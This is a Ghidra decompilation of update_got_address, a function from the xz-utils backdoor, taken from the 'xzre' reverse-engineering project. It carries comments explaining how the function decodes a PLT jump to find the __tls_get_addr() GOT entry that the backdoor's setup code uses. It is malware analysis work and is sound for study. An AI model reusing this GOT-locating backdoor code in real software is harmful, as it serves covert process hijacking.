// /home/kali/xzre-ghidra/xzregh/103FA0_update_got_address.c
// Function: update_got_address @ 0x103FA0
// Calling convention: __stdcall
// Prototype: void * __stdcall update_got_address(elf_entry_ctx_t * entry_ctx)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief finds the __tls_get_addr() GOT entry
 *
 *   this function first computes the location of the __tls_get_addr() PLT trampoline function by using
 *   the PLT offset constant from tls_get_addr_reloc_consts
 *
 *   then it decodes the PLT jmp instruction to get the address of the __tls_get_addr() GOT entry
 *
 *   the __tls_get_addr() GOT entry is used in backdoor_setup() to find the ELF header at the start of the memory mapped ld.so
 *
 *   calls get_tls_get_addr_random_symbol_got_offset() to update elf_entry_ctx_t::got_ptr and elf_entry_ctx_t::got_offset
 *   sets elf_entry_ctx_t::got_offset = 0
 *   sets elf_entry_ctx_t::cpuid_fn = 0
 *   stores the address of the __tls_get_addr() GOT entry in  elf_entry_ctx_t::got_ptr
 *
 *   @param entry_ctx
 *   @return void* the address of the __tls_get_addr() GOT entry
 */

void * update_got_address(elf_entry_ctx_t *entry_ctx)

{
  void *pvVar1;
  ulong uVar2;
  long lVar3;
  void *pvVar4;
  
  get_tls_get_addr_random_symbol_got_offset(entry_ctx);
  pvVar1 = (void *)((long)&_Lx86_coder_destroy +
                   (_Llzma_block_uncomp_encode_0 - (entry_ctx->got_ctx).got_offset));
  (entry_ctx->got_ctx).return_address = (void *)0x0;
  (entry_ctx->got_ctx).cpuid_fn = (void *)0x0;
  uVar2 = (ulong)(*(char *)((long)pvVar1 + 1) == '\x0f');
  lVar3 = uVar2 * 4;
  if (*(char *)((long)pvVar1 + uVar2 * 4) == -0xe) {
    lVar3 = lVar3 + 1;
  }
  pvVar4 = (void *)0x0;
  if ((void *)(ulong)(*(ushort *)((long)pvVar1 + lVar3) + 1 & 0xffff) ==
      (entry_ctx->got_ctx).got_ptr) {
    pvVar4 = (void *)((long)pvVar1 + lVar3 + -0x12 + (ulong)*(uint *)((long)pvVar1 + lVar3 + 2));
  }
  (entry_ctx->got_ctx).got_ptr = pvVar4;
  return pvVar1;
}

